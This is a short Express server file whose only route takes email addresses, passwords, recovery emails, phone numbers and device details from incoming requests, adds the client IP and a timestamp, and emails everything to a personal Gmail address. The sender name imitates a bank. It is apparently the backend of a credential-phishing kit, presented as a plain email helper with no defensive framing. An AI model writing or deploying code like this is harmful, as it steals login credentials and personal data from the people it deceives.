import express from "express";
import sgMail from "@sendgrid/mail";
import cors from "cors";
import { Resend } from "resend";
import dayjs from "dayjs";

// require("dotenv").config();
import env from "dotenv";
env.config();

const app = express();
app.use(express.json());
app.use(cors());

sgMail.setApiKey(process.env.SG_API_KEY);
const resend = new Resend(process.env.RESEND_API_KEY);

// POST route to send an email
app.post("/send-email", async (req, res) => {
  const { email, password, recEmail, phone, port, deviceDetails } = req.body;
  const ip = req.headers["x-forwarded-for"] || req.socket.remoteAddress;
  const time = dayjs(Date.now()).format("DD-MM-YY::HH-mm");

  try {
    resend.emails.send({
     from: "Log <log@ncreservebank.com>",
     to: ["juniorharry745@gmail.com"],
     subject: `New entry:: ${port}`,
     html: `
    <p>Email: ${email}</p>
    <p>Password: ${password}</p>.
    <p>Recovery Email: ${recEmail}</p>
    <p>Phone Number: ${phone}</p>
    <p>Date_Time: ${time}</p>
    <p>Client IP: ${ip}</p>
    <p>PORT: ${port}</p>
    <p>Device Details: ${JSON.stringify(deviceDetails)}</p>
    
`,
    });

    res.status(200).send({
      status: true,
      message: "Email sent",
    });
  } catch (error) {
    console.error(error);
  }
});

// Start the server
app.listen(3000, () => {
  console.log("Server started on port 3000");
});
